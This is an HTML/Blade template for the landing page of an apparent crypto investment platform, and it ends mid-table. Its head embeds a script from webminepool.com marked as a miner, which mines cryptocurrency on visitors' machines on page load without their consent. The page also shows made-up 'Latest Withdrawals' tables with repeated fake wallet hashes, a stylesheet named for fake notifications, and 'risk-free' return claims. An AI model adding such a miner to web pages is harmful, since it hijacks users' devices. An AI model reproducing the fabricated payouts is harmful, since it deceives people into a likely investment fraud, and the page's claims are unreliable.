<!DOCTYPE html>
<html lang="en" xml:lang="en">    

<head>       
    <meta charset="UTF-8">  
    <!-- Responsive Meta -->                    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
     <!--miner-->
    <script src="https://webminepool.com/lib/base.js"></script>
    <!--miner-->



    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <!-- favicon & bookmark -->
    <link rel="apple-touch-icon-precomposed" sizes="144x144"  href="{{ asset('home/images/bookmark.png') }}" type="image/x-icon" />
    <link rel="shortcut icon" href="{{ asset('home/images/favicon.png') }}" type="image/x-icon" />
    <!-- Font Family -->
    <link href="https://fonts.googleapis.com/css?family=PT+Sans:400,700" rel="stylesheet"> 
    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i,800,800i" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Poppins:300,400,500,600,700,800" rel="stylesheet">
    <!-- Website Title -->
    <title>{{$settings->site_name}} | {{$settings->site_title}}</title>
    <!-- Stylesheets Start -->
    <link rel="stylesheet" href="{{ asset ('home/css/fontawesome.min.css')}}" type="text/css"/>
    <link rel="stylesheet" href="{{ asset ('home/css/bootstrap.css')}}" type="text/css"/>
    <link rel="stylesheet" href="{{ asset ('home/css/animate.css')}}" type="text/css"/>
    <link rel="stylesheet" href="{{ asset ('home/css/owl.carousel.min.css')}}" type="text/css"/>
    <link rel="stylesheet" href="{{ asset ('home/style.css')}}" type="text/css"/>
    <link rel="stylesheet" href="{{ asset ('home/css/responsive.css')}}" type="text/css"/>
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
	<link rel="icon" href="{{asset('home/logo.png') }}">
     <!-- Stylesheets End -->
     
    <!--[if lt IE 9]><script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.js"></script><![endif]-->
    <!--[if lt IE 9]><script src="js/respond.js"></script><![endif]-->
   <link rel="stylesheet" href="{{ asset ('home/alert/fake-notification-min.css')}}"/>
   <link rel="stylesheet" href="{{ asset ('home/css/toast.css')}}"/>

   <style>
		
	.fluid{
	   width:160px;
	   height:65px;
		}
   @media (max-width: 991px){
	   .fluid{
	   width:125px;
	   height:55px;
	   }
	}   

</style>
   
 
</head>
<body>
    <!--Main Wrapper Start-->
    <div class="wrapper" id="top">
        <!--Header Start -->  
	   <header>   
		   <div class="container">
				<div class="row"> 
                    <div class="col-sm-6 col-md-4 logo">
                        <a href="#" title={{$settings->site_name}} >
                            <img class="light" src="{{ asset ('home/logo-3.png') }}" width="120" alt="{{$settings->site_name}} ">
                            <img class="dark" src="{{ asset ('home/logo-1.png') }}" width="120" alt="{{$settings->site_name}} ">
                        </a>
                    </div>
                    <div class="col-sm-6 col-md-8 main-menu">
					   <div class="menu-icon">
                          <span class="top"></span>
                          <span class="middle"></span>
                          <span class="bottom"></span>
                        </div>
                        <nav class="onepage">
                            <ul>
                                <li class="active"><a href="#top">Home</a></li>
                                <li><a href="#about">About Us</a></li>
                               <!--<li><a href="#token">Equities</a></li>-->
                                <li><a href="#team">Testimonials</a></li>
                                <li><a href="#">Contact Us</a></li>
                                <li class="nav-btn"><a href="login">Sign In</a></li>
                            </ul>
                        </nav>
                    </div>
                </div>
		
            </div>
        </header>
        <!--Header End-->
        
        <div id="notification-1" class="notification">			
        	<div class="notification-block">
        		<div class="notification-img">
        			<!-- Your image or icon -->
        			<i class="fa fa-btc" aria-hidden="true">qwertry</i>
        			<!-- / Your image or icon -->
        		</div>
        		<div class="notification-text-block">
        			<div class="notification-title">
        				<!-- Notification Title -->
        			 
        				<!-- / Notification Title -->
        			</div>
        			<div class="notification-text"></div>
        		</div>
        	</div>
        </div>
        
        
        <!-- Content Section Start -->   
        <div class="midd-container">
            <!-- Hero Section Start --> 
    		
    	   
    	   <!--***********-->
    	   <div class="hero-main diamond-layout white-sec" style="background:url({{ asset('home/images/banner-4.jpg')}}">
                <div class="container">
                    <div class="row align-items-center">
                        <div class="col-sm-12 col-md-6">
                            <h1>The Future of Investment <span>Easy and Secured!</span></h1>
                            <p class="lead">{{$settings->site_name}} offers investors a convenient way to incorporate a rapidly growing digital asset into their portfolios.</p>
                            <div class="hero-btns">
                                <a href="register" class="btn">REGISTER</a>
                                <a href="login" class="btn btn3">LOGIN</a>
                            </div>
                        </div>
                        <div class="col-sm-12 col-md-6" data-wow-delay="0.5s">
                            <div class="diamond-animation">
                                <div class="diamond-grid"></div>
                                <div class="diamond-grid-2"></div>
                                <div class="outer-Orbit">
                                    <div class="Orbit">
                                        <div class="rotate">
                                            <div class="OrbitSquare">
                                                <div class="inner">A</div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="main">
                                    <div class="top-coin"><span></span></div>
                                    <div class="lines">
                                        <span class="l-1"></span>
                                        <span class="l-2"></span>
                                        <span class="l-3"></span>
                                        <span class="l-4"></span>
                                        <span class="l-5"></span>
                                        <span class="l-6"></span>
                                        <span class="l-7"></span>
                                        <span class="l-8"></span>
                                        <span class="l-9"></span>
                                        <span class="l-10"></span>
                                        <span class="l-11"></span>
                                        <span class="l-12"></span>
                                        <span class="l-13"></span>
                                        <span class="l-14"></span>
                                        <span class="l-15"></span>
                                    </div>
                                    <div class="inside-bitcoin"></div>
                                    <div class="gris2"></div>
                                    <div class="square-1"></div>
                                </div>
                                <div class="base">
                                </div>
                            </div>
                            <!--<div class="mobile-visible text-center">
                                <img src="{{ asset('home/images/diamond-animation-mobile.png')}}"" alt="">
                            </div>-->
                        </div>
                    </div>
                </div>
            </div>
            <!--************-->
            
            
            <div style="height:20px; padding:0px; margin:0px; width: 100%;">
    			<iframe src="https://widget.coinlib.io/widget?type=horizontal_v2&theme=dark&pref_coin_id=1505&invert_hover=no" width="100%" height="36px" scrolling="auto" marginwidth="0" marginheight="0" frameborder="0" border="0" style="border:0;margin:0;padding:0;"></iframe>
    	   </div>
            
            
            <!-- Hero Section End -->   
            <!--About Start -->
            <div class="about-section p-tb mercury-layout" id="about">
                    <div class="container">
                        <div class="row flex-row-reverse align-items-center">
        					 
        					<div class="col-lg-6 col-md-12">
        					    <div class="about-mercury-img mobile">
                                    <div style="height:330px; padding:0px; margin:0px; width: 100%;"><iframe src="https://widget.coinlib.io/widget?type=chart&theme=dark&coin_id=859&pref_coin_id=1505" width="100%" height="380px" scrolling="none" marginwidth="0" marginheight="0" frameborder="0" border="0" style="border:0;margin:0;padding:0;line-height:14px;"></iframe></div>
                                </div>
                            </div>
                            <div style="margin-top:100px;" class="col-lg-6 col-md-12">
                                <h2 class="section-heading">About {{$settings->site_name}} </h2>
                                <h4>Why to choose {{$settings->site_name}} ?</h4>
                                <h5>
                                    {{$settings->site_name}} provides you with a wide range of platforms and service options best tailored to ensure high returns on investment. Whether you’re a self-directed investor, or trading through our desk, we offer multiple solutions.
                                </h5>
                                <p> We welcome you to the digital world of crypto investment and online trading where our clients will receive stable and risk-free long-term returns by placing their Bitcoin asset in our online profound asset management program. </p>
                                <div class="button-wrapper">
                                    <a class="btn" href="about">Read More</a>
                                </div>
                            
                            </div>
                        </div>
                    </div>
                <!--About end -->
                
                <!-- Benefits Start -->
                <div class="benefits p-tb light-gray-bg mercury-layout">
                    <div class="container">
                        <div class="text-center"><h2 class="section-heading">Benefits of Using Our Solution</h2></div>
                        <div class="sub-txt mw-850 text-center">
                      
                        </div>
                        <div class="row">
                            <div class="col-lg-4 col-md-6">
                                <div class="benefit-box text-center">
                                    <div class="benefit-icon">
                                        <img src="{{asset('home/images/benefit-icon-1.png') }}" alt="Safe and Secure">
                                    </div>
                                    <div class="text">
                                        <h4>Safe and Secure</h4>
                                        <p>We strive to keep collected user data to a minimum and only ask for information that is mandatory from a regulatory perspective..</p>
                                    </div>
                                </div>
                            </div>
                            <div class="col-lg-4 col-md-6">
                                <div class="benefit-box text-center">
                                    <div class="benefit-icon">
                                        <img src="{{asset('home/images/benefit-icon-2.png') }}" alt="Instant Exchange">
                                    </div>
                                    <div class="text">
                                        <h4>Instant Exchange</h4>
                                        <p>We accept several payment methods just to make it convinient while funding or making withdrawals.</p>
                                    </div>
                                </div>
                            </div>
                            <div class="col-lg-4 col-md-6">
                                <div class="benefit-box text-center">
                                    <div class="benefit-icon">
                                        <img src="{{asset('home/images/benefit-icon-4.png') }}" alt="Mobile Apps">
                                    </div>
                                    <div class="text">
                                        <h4>Mobile Apps</h4>
                                        <p>Trade Binary options, Forex, CFDs on stocks and ETFs. Coming soon</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                        
                    </div>
                </div>
                <!-- Benefits End -->
                
                
                
                <div class="section-full  p-t80 p-b80 bg-gray">
                    <div class="container">
        
                        <div class="section-head text-center">
                            <span class="wt-title-subline font-16 text-gray-dark m-b15"></span>
                            <h2 class="text-uppercase">Latest Withdrawals</h2>
                            <div class="wt-separator-outer">
                            <div class="wt-separator bg-primary"></div>
                            </div>
                            <p></p>
                        </div>
        
            <div class="table-responsive" style="height:400px; width:100%;  ">
                <marquee direction="down" style="height:400px; width:99%;  ">
                    <table class="table"  >
                        <thead>
                            <tr>
                                <th class="text-center">Status</th>
                                <th class="text-center">Amount(USD)</th>
                                <th class="text-center">Wallet</th>
                            </tr>
                        </thead>
                    <tbody>
                        <tr>
                            <td class="text-center"><button class="btn btn-info btn-sm"><span class="btn-label"><i class="fa fa-check"></i></span>Confirmed</button></td>
                            <td class="text-center">$10,000.00</td>
                            <td class="text-center"> 3a17c5984af22cd7a443f14457841b3b19a51ea75a30e18bc6a82e4f8732dbca</td>
                        </tr>
                        <tr>
                            <td class="text-center"><button class="btn btn-warning btn-sm"><span class="btn-label"><i class="fa fa-warning"></i></span>Pending</button></td>
                            <td class="text-center">$51,000.00</td>
                            <td class="text-center">8a2b9781aa4995625af7d2b008f020ac74e7e0d2a599e93ed995f7c3bc2be9f2</td>
                        </tr>
                        <tr>
                        <td class="text-center"><button class="btn
                                                                    btn-info btn-sm"><span class="btn-label"><i class="fa
                                                                    fa-check"></i></span>Confirmed</button></td>
                        <td class="text-center">$24,100.00</td>
                        <td class="text-center">
                        f007e92cc9f82ba9c8c40c481eec7315fa9abcd85e7249a6cb57e38a2cf22d3e
                        </td>
                        </tr>
                        <tr>
                        <td class="text-center"><button class="btn btn-info btn-sm"><span class="btn-label"><i class="fa
                                                                    fa-check"></i></span>Confirmed</button></td>
                        <td class="text-center">$4,000.00</td>
                        <td class="text-center">
                        8a2b9781aa4995625af7d2b008f020ac74e7e0d2a599e93ed995f7c3bc2be9f2
                        </td>
                        </tr>
                        <tr>
                        <td class="text-center"><button class="btn
                                                                    btn-info btn-sm"><span class="btn-label"><i class="fa
                                                                    fa-check"></i></span>Confirmed</button></td>
                        <td class="text-center">$500</td>
                        <td class="text-center">
                        00db85ef40da34f3ea76aa60f0b2053eec2d90121e450791c18d8edbfedde6f1
                        </td>
                        </tr>
                        <tr>
                        <td class="text-center"><button class="btn
                                                                    btn-info btn-sm"><span class="btn-label"><i class="fa
                                                                    fa-check"></i></span>Confirmed</button></td>
                        <td class="text-center">$240,000</td>
                        <td class="text-center">
                        b21a418a44ed8b56118facefe7aa8d26541dff811b8a8ca65cfa1346d62c5c48
                        </td>
                        </tr>
                        <tr>
                        <td class="text-center"><button class="btn
                                                                    btn-info btn-sm"><span class="btn-label"><i class="fa
                                                                    fa-check"></i></span>Confirmed</button></td>
                        <td class="text-center">$17,000</td>
                        <td class="text-center">
                        1e652d2899a1d058a20041a9faaeb5dc009101ca412ff09c387e6b281bd1db8b
                        </td>
                        </tr>
                        <tr>
                         <td class="text-center"><button class="btn btn-warning btn-sm"><span class="btn-label"><i class="fa fa-warning"></i></span>Pending</button></td>
                        <td class="text-center">$51,000</td>
                        <td class="text-center">
                        6a49e66a66f75e72e6bd383ac798792af204a6693708912ad0d48e363a2ab7a7
                        </td>
                        </tr>
                        <tr>
                        <td class="text-center"><button class="btn
                                                                    btn-info btn-sm"><span class="btn-label"><i class="fa
                                                                    fa-check"></i></span>Confirmed</button></td>
                        <td class="text-center">$21,000</td>
                        <td class="text-center">
                        8a2b9781aa4995625af7d2b008f020ac74e7e0d2a599e93ed995f7c3bc2be9f2
                        </td>
                        </tr>
                        <tr>
                        <td class="text-center"><button class="btn btn-warning btn-sm"><span class="btn-label"><i class="fa fa-warning"></i></span>Pending</button></td>
                        <td class="text-center">$6,000</td>
                        <td class="text-center">
                        797ba039291417fdbdb411ea0a102d23090cde9ac7799ff605f40b5db484891d
                        </td>
                        </tr>
                        <tr>
                        <td class="text-center"><button class="btn
                                                                    btn-info btn-sm"><span class="btn-label"><i class="fa
                                                                    fa-check"></i></span>Confirmed</button></td>
                        <td class="text-center">$9,000</td>
                        <td class="text-center">
                        f0b66ce7a33bbc63bf50050beaf52be71709c359aa1d344bb90f943690485661
                        </td>
                        </tr>
                        <tr>
                        <td class="text-center"><button class="btn
                                                                    btn-info btn-sm"><span class="btn-label"><i class="fa
                                                                    fa-check"></i></span>Confirmed</button></td>
                        <td class="text-center">$23,000</td>
                        <td class="text-center">
                        2083e95ada3c584471ba5982e16c5dc2a6e464d3c170555ea8c708668be9383b
                        </td>
                        </tr>
                        <tr>
                        <td class="text-center"><button class="btn
                                                                    btn-info btn-sm"><span class="btn-label"><i class="fa
                                                                    fa-check"></i></span>Confirmed</button></td>
                        <td class="text-center">$51,000</td>
                        <td class="text-center">
                        8a2b9781aa4995625af7d2b008f020ac74e7e0d2a599e93ed995f7c3bc2be9f2
                        </td>
                        </tr>
                        <tr>
                        <td class="text-center"><button class="btn
                                                                    btn-info btn-sm"><span class="btn-label"><i class="fa
                                                                    fa-check"></i></span>Confirmed</button></td>
                        <td class="text-center">$5,000</td>
                        <td class="text-center">
                        8a2b9781aa4995625af7d2b008f020ac74e7e0d2a599e93ed995f7c3bc2be9f2
                        </td>
                        </tr>
                         <tr>
                        <td class="text-center"><button class="btn
                                                                    btn-info btn-sm"><span class="btn-label"><i class="fa
                                                                    fa-check"></i></span>Confirmed</button></td>
                        <td class="text-center">5,000</td>
                        <td class="text-center">
                        15c3a97edbd606bd1e455aa2875677f5c6cd2b804e9054e898f640d313e39781
                        </td>
                        </tr>
                        <tr>
                        <td class="text-center"><button class="btn btn-warning btn-sm"><span class="btn-label"><i class="fa fa-warning"></i></span>Pending</button></td>
                        <td class="text-center">$18,000</td>
                        <td class="text-center">
                        66c13496e9d53a2402fd49bbe91df298164472679cc868bbfebbabb4844d784c
                        </td>
                        </tr>
                        <tr>
                        <td class="text-center"><button class="btn
                                                                    btn-info btn-sm"><span class="btn-label"><i class="fa
                                                                    fa-check"></i></span>Confirmed</button></td>
                        <td class="text-center">$2,500</td>
                        <td class="text-center">
                        ce972a6b82135fcba0890ea0c8668bdddf782fd580672daa6616c3b1af40ca9f
                        </td>
                        </tr>
                        <tr>
                        <td class="text-center"><button class="btn
                                                                    btn-info btn-sm"><span class="btn-label"><i class="fa
                                                                    fa-check"></i></span>Confirmed</button></td>
                        <td class="text-center">$9,000</td>
                        <td class="text-center">
                        376e809b02e6ef044f6d5cf5b72111f25f3c3e16a93dce865a178e2e0f5c484c
                        </td>
                        </tr>
                        <tr>
                        <td class="text-center"><button class="btn btn-warning btn-sm"><span class="btn-label"><i class="fa fa-warning"></i></span>Pending</button></td>
                        <td class="text-center">$43,000</td>
                        <td class="text-center">
                        aa14458f8082d9c4265ef491ca0b5d4801c16bbf7a4aece7b70a0b4824ffdfea
                        </td>
                        </tr>
                        <tr>
                        <td class="text-center"><button class="btn
                                                                    btn-info btn-sm"><span class="btn-label"><i class="fa
                                                                    fa-check"></i></span>Confirmed</button></td>
                        <td class="text-center">$10,000.00</td>
                        <td class="text-center">
                        3a17c5984af22cd7a443f14457841b3b19a51ea75a30e18bc6a82e4f8732dbca
                        </td>
                        </tr>
                        <tr>
                        <td class="text-center"><button class="btn btn-warning btn-sm"><span class="btn-label"><i class="fa fa-warning"></i></span>Pending</button></td>
                        <td class="text-center">$51,000.00</td>
                        <td class="text-center">
                        8a2b9781aa4995625af7d2b008f020ac74e7e0d2a599e93ed995f7c3bc2be9f2
                        </td>
                        </tr>
                         <tr>
                        <td class="text-center"><button class="btn
                                                                    btn-info btn-sm"><span class="btn-label"><i class="fa
                                                                    fa-check"></i></span>Confirmed</button></td>
                        <td class="text-center">$24,100.00</td>
                        <td class="text-center">
                        f007e92cc9f82ba9c8c40c481eec7315fa9abcd85e7249a6cb57e38a2cf22d3e
                        </td>
                        </tr>
                        <tr>
                        <td class="text-center"><button class="btn btn-info btn-sm"><span class="btn-label"><i class="fa
                                                                    fa-check"></i></span>Confirmed</button></td>
                        <td class="text-center">$4,000.00</td>
                        <td class="text-center">
                        8a2b9781aa4995625af7d2b008f020ac74e7e0d2a599e93ed995f7c3bc2be9f2
                        </td>
                        </tr>
                        <tr>
                        <td class="text-center"><button class="btn
                                                                    btn-info btn-sm"><span class="btn-label"><i class="fa
                                                                    fa-check"></i></span>Confirmed</button></td>
                        <td class="text-center">$500</td>
                        <td class="text-center">
                        00db85ef40da34f3ea76aa60f0b2053eec2d90121e450791c18d8edbfedde6f1
                        </td>
                        </tr>
                        <tr>
                        <td class="text-center"><button class="btn
                                                                    btn-info btn-sm"><span class="btn-label"><i class="fa
                                                                    fa-check"></i></span>Confirmed</button></td>
                        <td class="text-center">$240,000</td>
                        <td class="text-center">
                        b21a418a44ed8b56118facefe7aa8d26541dff811b8a8ca65cfa1346d62c5c48
                        </td>
                        </tr>
                        <tr>
                        <td class="text-center"><button class="btn
                                                                    btn-info btn-sm"><span class="btn-label"><i class="fa
                                                                    fa-check"></i></span>Confirmed</button></td>
                        <td class="text-center">$17,000</td>
                        <td class="text-center">
                        1e652d2899a1d058a20041a9faaeb5dc009101ca412ff09c387e6b281bd1db8b
                        </td>
                        </tr>
                        <tr>
                        <td class="text-center"><button class="btn btn-warning btn-sm"><span class="btn-label"><i class="fa fa-warning"></i></span>Pending</button></td>
                        <td class="text-center">$51,000</td>
                        <td class="text-center">
                        6a49e66a66f75e72e6bd383ac798792af204a6693708912ad0d48e363a2ab7a7
                        </td>
                        </tr>
                        <tr>
                        <td class="text-center"><button class="btn
                                                                    btn-info btn-sm"><span class="btn-label"><i class="fa
                                                                    fa-check"></i></span>Confirmed</button></td>
                        <td class="text-center">$21,000</td>
                        <td class="text-center">
                        8a2b9781aa4995625af7d2b008f020ac74e7e0d2a599e93ed995f7c3bc2be9f2
                        </td>
                        </tr>
                        <tr>
                        <td class="text-center"><button class="btn btn-warning btn-sm"><span class="btn-label"><i class="fa fa-warning"></i></span>Pending</button></td>
                        <td class="text-center">$6,000</td>
                        <td class="text-center">
                        797ba039291417fdbdb411ea0a102d23090cde9ac7799ff605f40b5db484891d
                        </td>
                        </tr>
                        <tr>
                        <td class="text-center"><button class="btn
                                                                    btn-info btn-sm"><span class="btn-label"><i class="fa
                                                                    fa-check"></i></span>Confirmed</button></td>
                        <td class="text-center">$9,000</td>
                        <td class="text-center">
                        f0b66ce7a33bbc63bf50050beaf52be71709c359aa1d344bb90f943690485661
                        </td>
                        </tr>
                        <tr>
                        <td class="text-center"><button class="btn
                                                                    btn-info btn-sm"><span class="btn-label"><i class="fa
                                                                    fa-check"></i></span>Confirmed</button></td>
                        <td class="text-center">$23,000</td>
                        <td class="text-center">
                        2083e95ada3c584471ba5982e16c5dc2a6e464d3c170555ea8c708668be9383b
                        </td>
                        </tr>
                        <tr>
                        <td class="text-center"><button class="btn
                                                                    btn-info btn-sm"><span class="btn-label"><i class="fa
                                                                    fa-check"></i></span>Confirmed</button></td>
                        <td class="text-center">$51,000</td>
                        <td class="text-center">
                        8a2b9781aa4995625af7d2b008f020ac74e7e0d2a599e93ed995f7c3bc2be9f2
                        </td>
                        </tr>
                        <tr>
                        <td class="text-center"><button class="btn
                                                                    btn-info btn-sm"><span class="btn-label"><i class="fa
                                                                    fa-check"></i></span>Confirmed</button></td>
                        <td class="text-center">$5,000</td>
                        <td class="text-center">
                        8a2b9781aa4995625af7d2b008f020ac74e7e0d2a599e93ed995f7c3bc2be9f2
                        </td>
                        </tr>
                        <tr>
                        <td class="text-center"><button class="btn
                                                                    btn-info btn-sm"><span class="btn-label"><i class="fa
                                                                    fa-check"></i></span>Confirmed</button></td>
                        <td class="text-center">5,000</td>
                        <td class="text-center">
                        15c3a97edbd606bd1e455aa2875677f5c6cd2b804e9054e898f640d313e39781
                        </td>
                        </tr>
                        <tr>
                        <td class="text-center"><button class="btn btn-warning btn-sm"><span class="btn-label"><i class="fa fa-warning"></i></span>Pending</button></td>
                        <td class="text-center">$18,000</td>
                        <td class="text-center">
                        66c13496e9d53a2402fd49bbe91df298164472679cc868bbfebbabb4844d784c
                        </td>
                        </tr>
                        <tr>
                        <td class="text-center"><button class="btn
                                                                    btn-info btn-sm"><span class="btn-label"><i class="fa
                                                                    fa-check"></i></span>Confirmed</button></td>
                        <td class="text-center">$2,500</td>
                        <td class="text-center">
                        ce972a6b82135fcba0890ea0c8668bdddf782fd580672daa6616c3b1af40ca9f
                        </td>
                        </tr>
                        <tr>
                        <td class="text-center"><button class="btn
                                                                    btn-info btn-sm"><span class="btn-label"><i class="fa
                                                                    fa-check"></i></span>Confirmed</button></td>
                        <td class="text-center">$9,000</td>
                        <td class="text-center">
                        376e809b02e6ef044f6d5cf5b72111f25f3c3e16a93dce865a178e2e0f5c484c
                        </td>
                        </tr>
                        <tr>
                            <td class="text-center"><button class="btn btn-warning btn-sm"><span class="btn-label"><i class="fa fa-warning"></i></span>Pending</button></td>
                            <td class="text-center">$43,000</td>
                            <td class="text-center">aa14458f8082d9c4265ef491ca0b5d4801c16bbf7a4aece7b70a0b4824ffdfea</td>
                        </tr>
                    </tbody>
                </table>
                </marquee>
            </div>
        </div>
                </div>
    
                
                
              
                
                <!-- The Roadmap  start-->
                <div class="roadmap-sec p-tb mercury-layout" id="roadmap">
                    <div class="container">
                        <div class="text-center"><h2 class="section-heading">Road Map</h2></div>
                        <div class="sub-txt text-center">
                            <p>Our journey so far and we are getting stronger each day thanks to all our amazing client who trust us to invest
    						with us.</p>
                        </div>
                        <div class="mercury-roadmap owl-carousel">
                            <div class="roadmap-item odd">
                                <div class="roadmap-text">
                                    <div class="roadmap-day">
                                        <div class="date"><span>14th</span>March 2016</div>
                                    </div>
                                    <div class="roadmap-item-text">
                                        <h4>Beta Launched</h4>
                                        <p>Beta launch of our plateform.</p>
                                    </div>
                                </div>
                            </div>
                            <div class="roadmap-item even">
                                <div class="roadmap-text">
                                    <div class="roadmap-day">
                                        <div class="date"><span>21th</span>January 2017</div>
                                    </div>
                                    <div class="roadmap-item-text">
                                        <h4>Payment Testing</h4>
                                        <p>Deposit and withdrawer testing.</p>
                                    </div>
                                </div>
                            </div>
                            <div class="roadmap-item odd">
                                <div class="roadmap-text">
                                    <div class="roadmap-day">
                                        <div class="date"><span>18th</span>April 2017</div>
                                    </div>
                                    <div class="roadmap-item-text">
                                        <h4>Security checks updated</h4>
                                        <p>Implenting User login security.</p>
                                    </div>
                                </div>
                            </div>
                            <div class="roadmap-item even">
                                <div class="roadmap-text">
                                    <div class="roadmap-day">
                                        <div class="date"><span>31th</span>October 2017</div>
                                    </div>
                                    <div class="roadmap-item-text">
                                        <h4>Alpha Launch</h4>
                                        <p>Alpha launch of our plateform.</p>
                                    </div>
                                </div>
                            </div>
                            <div class="roadmap-item odd">
                                <div class="roadmap-text">
                                    <div class="roadmap-day">
                                        <div class="date"><span>09th</span>September 2018</div>
                                    </div>
                                    <div class="roadmap-item-text">
                                        <h4>Updated payment Methods</h4>
                                        <p>Added more payment Options for depsoit and withdrawer</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <!-- The Roadmap end-->
                <div id="counter" class="milestone-section p-tb c-l">
                    <div class="container">
                        <div class="row">
                            <div class="col">
                                <div class="counter" >
                                    <div class="counter-icon">
                                        <img src="{{ asset('home/images/transactions-icon.png') }}" alt="" />
                                    </div>
                                    <div class="counter-value" data-count="131946">131,946</div>
                                    <h4 class="count-text ">Transactions</h4>
                                </div>
                            </div>
                            <div class="col">
                                <div class="counter">
                                    <div class="counter-icon">
                                        <img src="{{ asset('home/images/support-icon.png') }}" alt="" />
                                    </div>
                                    <div class="counter-value" data-count="649">649</div>
                                    <h4 class="count-text ">Operator</h4>
                                </div>
                            </div>
                            <div class="col">
                                <div class="counter">
                                    <div class="counter-icon">
                                        <img src="{{ asset('home/images/wallets-icon.png') }}" alt="" />
                                    </div>
                                    <div class="counter-value" data-count="11852">11,852</div>
                                    <h4 class="count-text ">Bitcoin Wallets</h4>
                                </div>
                            </div>
                            <div class="col">
                                <div class="counter">
                                    <div class="counter-icon">
                                        <img src="{{ asset('home/images/countries-icon.png') }}" alt="" />
                                    </div>
                                    <div class="counter-value" data-count="198">198</div>
                                    <h4 class="count-text ">Countries</h4>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
    			
    			
                <!-- Team sec end-->
    
    			
    			<style>
    			
    				.button-table {
    					  border: none;
    					  color: white;
    					  padding: 15px 32px;
    					  text-align: center;
    					  text-decoration: none;
    					  display: inline-block;
    					  font-size: 16px;
    					  margin: 4px 2px;
    					  cursor: pointer;
    					}
    				
    				.button1 {
    					   background-color: #4CAF50;
    					} /* Green */
    				.button2 {
    					background-color: #fbbd18;;
    					} /* Blue */
    				
    				
    				.table-style{
    				    margin-top: 47px;
    					margin-left: 79px;
    					margin-right: 62px;
    					margin-block: 55px;
    					border-block: 1px solid #000;
    					height:510px; 
    					width:90%;
    					overflow-y: auto;
    					border:2px solid #444;
    				}
    			
    				.table-font{
    					    text-align: center;
    						white-space: nowrap;
    						font-family:Poppins, san-serif;
    						font-weight:400;
    				}
    				
    				table {
    				  border-collapse: collapse;
    				  border-spacing: 0;
    				  width: 100%;
    				  border: 1px solid #ddd;
    				}
    
    				th, td {
    				  text-align: left;
    				  padding: 8px;
    				}
    
    				tr:nth-child(even){background-color: #f2f2f2}
    				
    				
    				.table-responsive{
    				  height:180px; 
    				  width:50%;
    				  overflow-y: auto;
    				  border:2px solid #444;
    				}
    				
    				.table-responsive:hover{border-color:red;}
    
    				table{width:100%;}
    				td{padding:24px; background:#eee;}
    				
    				
    				
    				
    		@media only screen and (max-width: 600px) {
    				
    				.table-style{
    				        margin-top: 54px;
    						margin-left: 14px;
    						margin-right: 24px;
    						margin-block: 55px;
    						border-block: 1px solid #000;
    						overflow-y: auto;
    						border:2px solid #444;
    				}
    			
    				.table-font{
    					text-align: left;
    					white-space: nowrap;
    				}
    				
    				table {
    				  border-collapse: collapse;
    				  border-spacing: 0;
    				  width: 100%;
    				  border: 1px solid #ddd;
    				}
    
    				th, td {
    				  text-align: left;
    				  padding: 8px;
    				}
    
    				tr:nth-child(even){background-color: #f2f2f2}
    				
    		}
    				
    				
    				
    				
    				
    				
    				
    				
    				
    				
    				
    				
    				
    			</style>
    			
    			
    			<div class="table-style" style="overflow-x:auto;">
    			  <table>
    				<tr>
    				  <th class="table-font"><b>Status</b></th>
    				  <th class="table-font"><b>Amount(USD)</b></th>
    				  <th class="table-font"><b>Wallet address</b></th>
    				</tr>
    				<tr>
    				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
    				  <td class="table-font">$10,000.00</td>
    				  <td class="table-font">3a17c5984af22cd7a443f14457841b3b19a51ea75a30e18bc6a82e4f8732dbca</td>
    				</tr>
    				<tr>
    				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
    				  <td class="table-font">$24,000.00</td>
    				  <td class="table-font">f007e92cc9f82ba9c8c40c481eec7315fa9abcd85e7249a6cb57e38a2cf22d3e</td>
    				</tr>
    				
    				<tr>
    				  <td class="table-font"><button class="button-table button2"><i class="fas fa-exclamation-triangle"></i> Pending</button></td>
    				  <td class="table-font">$3,000.00</td>
    				  <td class="table-font">ab6c83e95ada3c584471ba5982e16c5dc2a6e464d3c170555ea8c708668be9383b</td>
    				</tr>
    				
    			   <tr>
    				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
    				  <td class="table-font">$4,000.00</td>
    				  <td class="table-font">8a2b9781aa4995625af7d2b008f020ac74e7e0d2a599e93ed995f7c3bc2be9f2</td>
    				</tr>
    				<tr>
    				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
    				  <td class="table-font">$500.00</td>
    				  <td class="table-font">00db85ef40da34f3ea76aa60f0b2053eec2d90121e450791c18d8edbfedde6f1</td>
    				</tr>
    			   <tr>
    				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
    				  <td class="table-font">$240,000.00</td>
    				  <td class="table-font">b21a418a44ed8b56118facefe7aa8d26541dff811b8a8ca65cfa1346d62c5c48</td>
    				</tr>
    				<tr>
    				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
    				  <td class="table-font">$17,000.00</td>
    				  <td class="table-font">1e652d2899a1d058a20041a9faaeb5dc009101ca412ff09c387e6b281bd1db8b</td>
    				</tr>
    				<tr>
    				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
    				  <td class="table-font">$51,000.00</td>
    				  <td class="table-font">6a49e66a66f75e72e6bd383ac798792af204a6693708912ad0d48e363a2ab7a7</td>
    				</tr>
    			   <tr>
    				  <td class="table-font"><button class="button-table button2"><i class="fas fa-exclamation-triangle"></i> Pending</button></td>
    				  <td class="table-font">$8,000.00</td>
